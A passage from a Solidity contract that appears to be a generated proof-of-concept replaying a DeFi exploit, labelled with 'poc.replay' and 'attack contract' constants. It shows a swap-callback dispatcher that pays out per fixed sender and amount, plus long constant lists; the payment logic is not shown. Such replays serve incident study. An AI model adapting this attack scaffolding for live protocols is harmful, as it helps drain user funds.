            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950345223018319 || arg1 == 13495950345223018319)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950345223018319]) {
                        _paySwap168();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950347013503480 || arg1 == 13495950347013503480)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950347013503480]) {
                        _paySwap155();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950348803988638 || arg1 == 13495950348803988638)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950348803988638]) {
                        _paySwap59();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950350594473798 || arg1 == 13495950350594473798)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950350594473798]) {
                        _paySwap68();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950352384958959 || arg1 == 13495950352384958959)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950352384958959]) {
                        _paySwap56();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950354175444119 || arg1 == 13495950354175444119)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950354175444119]) {
                        _paySwap45();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950355965929282 || arg1 == 13495950355965929282)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950355965929282]) {
                        _paySwap150();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950357756414442 || arg1 == 13495950357756414442)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950357756414442]) {
                        _paySwap79();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950359546899605 || arg1 == 13495950359546899605)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950359546899605]) {
                        _paySwap53();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950361337384767 || arg1 == 13495950361337384767)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950361337384767]) {
                        _paySwap66();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950363127869931 || arg1 == 13495950363127869931)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950363127869931]) {
                        _paySwap118();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950364918355094 || arg1 == 13495950364918355094)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950364918355094]) {
                        _paySwap149();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 13495950366708840258 || arg1 == 13495950366708840258)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_13495950366708840258]) {
                        _paySwap137();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608 && (arg0 == 100000 || arg1 == 100000)) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_100000]) _paySwap77();
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608
                        && (arg0 == 14260200223938238 || arg1 == 14260200223938238)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_14260200223938238]) {
                        _paySwap48();
                    }
                    return;
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (
                    msg.sender == 0xd0b53D9277642d899DF5C87A3966A349A798F224
                        && (arg0 == 10921226074968110 || arg1 == 10921226074968110)
                ) {
                    if (!_replayDone[REPLAY_TRANSFER_A_D0_B53_D_F224_10921226074968110]) {
                        _paySwap180();
                    }
                    return;
                }
            }
            uint256 callbackSequenceIndex = _nextDispatch(0xfa461e33);
            if (callbackSequenceIndex == 0) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_44]) _paySwap100();
                return;
            }
            if (callbackSequenceIndex == 1) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_91]) _paySwap190();
                return;
            }
            if (callbackSequenceIndex == 2) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_23]) _paySwap43();
                return;
            }
            if (callbackSequenceIndex == 3) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_51]) _paySwap107();
                return;
            }
            if (callbackSequenceIndex == 4) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_96]) _paySwap203();
                return;
            }
            if (callbackSequenceIndex == 5) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_11]) _paySwap20();
                return;
            }
            if (callbackSequenceIndex == 6) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_76]) _paySwap156();
                return;
            }
            if (callbackSequenceIndex == 7) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_86]) _paySwap175();
                return;
            }
            if (callbackSequenceIndex == 8) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_31]) _paySwap71();
                return;
            }
            if (callbackSequenceIndex == 9) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_97]) _paySwap204();
                return;
            }
            if (callbackSequenceIndex == 10) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_26]) _paySwap52();
                return;
            }
            if (callbackSequenceIndex == 11) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_38]) _paySwap85();
                return;
            }
            if (callbackSequenceIndex == 12) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_29]) _paySwap62();
                return;
            }
            if (callbackSequenceIndex == 13) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_56]) _paySwap115();
                return;
            }
            if (callbackSequenceIndex == 14) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_72]) _paySwap147();
                return;
            }
            if (callbackSequenceIndex == 15) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_50]) _paySwap106();
                return;
            }
            if (callbackSequenceIndex == 16) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_87]) _paySwap176();
                return;
            }
            if (callbackSequenceIndex == 17) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_93]) _paySwap199();
                return;
            }
            if (callbackSequenceIndex == 18) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_21]) _paySwap37();
                return;
            }
            if (callbackSequenceIndex == 19) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_80]) _paySwap164();
                return;
            }
            if (callbackSequenceIndex == 20) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_45]) _paySwap101();
                return;
            }
            if (callbackSequenceIndex == 21) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_13]) _paySwap22();
                return;
            }
            if (callbackSequenceIndex == 22) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_57]) _paySwap116();
                return;
            }
            if (callbackSequenceIndex == 23) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_69]) _paySwap144();
                return;
            }
            if (callbackSequenceIndex == 24) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_14]) _paySwap25();
                return;
            }
            if (callbackSequenceIndex == 25) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_1]) _paySwap1();
                return;
            }
            if (callbackSequenceIndex == 26) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_73]) _paySwap148();
                return;
            }
            if (callbackSequenceIndex == 27) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_82]) _paySwap167();
                return;
            }
            if (callbackSequenceIndex == 28) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_83]) _paySwap170();
                return;
            }
            if (callbackSequenceIndex == 29) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_9]) _paySwap14();
                return;
            }
            if (callbackSequenceIndex == 30) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_35]) _paySwap81();
                return;
            }
            if (callbackSequenceIndex == 31) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_59]) _paySwap121();
                return;
            }
            if (callbackSequenceIndex == 32) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_8]) _paySwap12();
                return;
            }
            if (callbackSequenceIndex == 33) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_6]) _paySwap9();
                return;
            }
            if (callbackSequenceIndex == 34) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_5]) _paySwap7();
                return;
            }
            if (callbackSequenceIndex == 35) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_92]) _paySwap196();
                return;
            }
            if (callbackSequenceIndex == 36) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_68]) _paySwap143();
                return;
            }
            if (callbackSequenceIndex == 37) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_79]) _paySwap162();
                return;
            }
            if (callbackSequenceIndex == 38) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_94]) _paySwap200();
                return;
            }
            if (callbackSequenceIndex == 39) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_19]) _paySwap33();
                return;
            }
            if (callbackSequenceIndex == 40) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_54]) _paySwap112();
                return;
            }
            if (callbackSequenceIndex == 41) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_53]) _paySwap111();
                return;
            }
            if (callbackSequenceIndex == 42) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_7]) _paySwap11();
                return;
            }
            if (callbackSequenceIndex == 43) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_70]) _paySwap145();
                return;
            }
            if (callbackSequenceIndex == 44) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_12]) _paySwap21();
                return;
            }
            if (callbackSequenceIndex == 45) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_4]) _paySwap6();
                return;
            }
            if (callbackSequenceIndex == 46) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_48]) _paySwap104();
                return;
            }
            if (callbackSequenceIndex == 47) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_22]) _paySwap42();
                return;
            }
            if (callbackSequenceIndex == 48) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_30]) _paySwap70();
                return;
            }
            if (callbackSequenceIndex == 49) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_17]) _paySwap29();
                return;
            }
            if (callbackSequenceIndex == 50) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_75]) _paySwap154();
                return;
            }
            if (callbackSequenceIndex == 51) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_46]) _paySwap102();
                return;
            }
            if (callbackSequenceIndex == 52) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_67]) _paySwap140();
                return;
            }
            if (callbackSequenceIndex == 53) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_36]) _paySwap82();
                return;
            }
            if (callbackSequenceIndex == 54) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_84]) _paySwap171();
                return;
            }
            if (callbackSequenceIndex == 55) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_25]) _paySwap49();
                return;
            }
            if (callbackSequenceIndex == 56) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_43]) _paySwap97();
                return;
            }
            if (callbackSequenceIndex == 57) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_2]) _paySwap3();
                return;
            }
            if (callbackSequenceIndex == 58) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_16]) _paySwap28();
                return;
            }
            if (callbackSequenceIndex == 59) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_55]) _paySwap114();
                return;
            }
            if (callbackSequenceIndex == 60) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_32]) _paySwap72();
                return;
            }
            if (callbackSequenceIndex == 61) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_18]) _paySwap31();
                return;
            }
            if (callbackSequenceIndex == 62) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_28]) _paySwap57();
                return;
            }
            if (callbackSequenceIndex == 63) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_66]) _paySwap138();
                return;
            }
            if (callbackSequenceIndex == 64) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_27]) _paySwap54();
                return;
            }
            if (callbackSequenceIndex == 65) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_40]) _paySwap87();
                return;
            }
            if (callbackSequenceIndex == 66) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_15]) _paySwap27();
                return;
            }
            if (callbackSequenceIndex == 67) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_65]) _paySwap136();
                return;
            }
            if (callbackSequenceIndex == 68) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_24]) _paySwap44();
                return;
            }
            if (callbackSequenceIndex == 69) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_42]) _paySwap94();
                return;
            }
            if (callbackSequenceIndex == 70) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_88]) _paySwap181();
                return;
            }
            if (callbackSequenceIndex == 71) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_34]) _paySwap76();
                return;
            }
            if (callbackSequenceIndex == 72) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_71]) _paySwap146();
                return;
            }
            if (callbackSequenceIndex == 73) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_77]) _paySwap159();
                return;
            }
            if (callbackSequenceIndex == 74) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_39]) _paySwap86();
                return;
            }
            if (callbackSequenceIndex == 75) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_90]) _paySwap189();
                return;
            }
            if (callbackSequenceIndex == 76) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_33]) _paySwap75();
                return;
            }
            if (callbackSequenceIndex == 77) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_63]) _paySwap129();
                return;
            }
            if (callbackSequenceIndex == 78) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_95]) _paySwap202();
                return;
            }
            if (callbackSequenceIndex == 79) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_49]) _paySwap105();
                return;
            }
            if (callbackSequenceIndex == 80) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_3]) _paySwap4();
                return;
            }
            if (callbackSequenceIndex == 81) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_98]) _paySwap205();
                return;
            }
            if (callbackSequenceIndex == 82) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_41]) _paySwap92();
                return;
            }
            if (callbackSequenceIndex == 83) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_100]) _paySwap207();
                return;
            }
            if (callbackSequenceIndex == 84) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_74]) _paySwap151();
                return;
            }
            if (callbackSequenceIndex == 85) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_64]) _paySwap130();
                return;
            }
            if (callbackSequenceIndex == 86) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_47]) _paySwap103();
                return;
            }
            if (callbackSequenceIndex == 87) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_60]) _paySwap125();
                return;
            }
            if (callbackSequenceIndex == 88) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_62]) _paySwap128();
                return;
            }
            if (callbackSequenceIndex == 89) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_52]) _paySwap110();
                return;
            }
            if (callbackSequenceIndex == 90) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_37]) _paySwap84();
                return;
            }
            if (callbackSequenceIndex == 91) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_89]) _paySwap184();
                return;
            }
            if (callbackSequenceIndex == 92) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_85]) _paySwap173();
                return;
            }
            if (callbackSequenceIndex == 93) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_10]) _paySwap17();
                return;
            }
            if (callbackSequenceIndex == 94) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_58]) _paySwap120();
                return;
            }
            if (callbackSequenceIndex == 95) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_20]) _paySwap34();
                return;
            }
            if (callbackSequenceIndex == 96) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_61]) _paySwap126();
                return;
            }
            if (callbackSequenceIndex == 97) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_81]) _paySwap166();
                return;
            }
            if (callbackSequenceIndex == 98) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_99]) _paySwap206();
                return;
            }
            if (callbackSequenceIndex == 99) {
                if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_78]) _paySwap160();
                return;
            }
            if (!_replayDone[REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_44]) _paySwap100();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    bytes32 private constant REPLAY_NFT_CB = keccak256("poc.replay.REPLAY_NFT_CB");
    bytes32 private constant REPLAY_BALANCE_OF_ATTACK_CONTRACT_1 =
        keccak256("poc.replay.REPLAY_BALANCE_OF_ATTACK_CONTRACT_1");
    bytes32 private constant REPLAY_BALANCE_OF_ATTACK_CONTRACT_2 =
        keccak256("poc.replay.REPLAY_BALANCE_OF_ATTACK_CONTRACT_2");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_184016562672189 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_184016562672189");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_1 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_1");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_2 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_2");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_3 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_3");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950273675231740 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950273675231740");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_4 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_4");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_5 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_5");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950241446499285 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950241446499285");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_6 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_6");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950289789598024 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950289789598024");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_7 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_7");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_8 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_8");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950200336960769 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950200336960769");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_9 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_9");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950261141835769 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950261141835769");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950250398924952 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950250398924952");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_10 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_10");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950341642048003 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950341642048003");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950245027469552 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950245027469552");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_11 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_11");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_12 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_12");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_13 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_13");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950316575255838 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950316575255838");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_400080026003 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_400080026003");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_14 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_14");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950268303776321 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950268303776321");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_15 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_15");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_16 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_16");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_17 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_17");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950214660841759 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950214660841759");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_18 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_18");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950219978582582 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950219978582582");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_19 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_19");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_20 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_20");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950329108651909 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950329108651909");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950284418142591 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950284418142591");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_21 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_19403880776155_21");
    bytes32 private constant REPLAY_TRANSFER_A_1_C450_D_F608_13495950264722806043 =
        keccak256("poc.replay.REPLAY_TRANSFER_A_1_C450_D_F608_13495950264722806043");
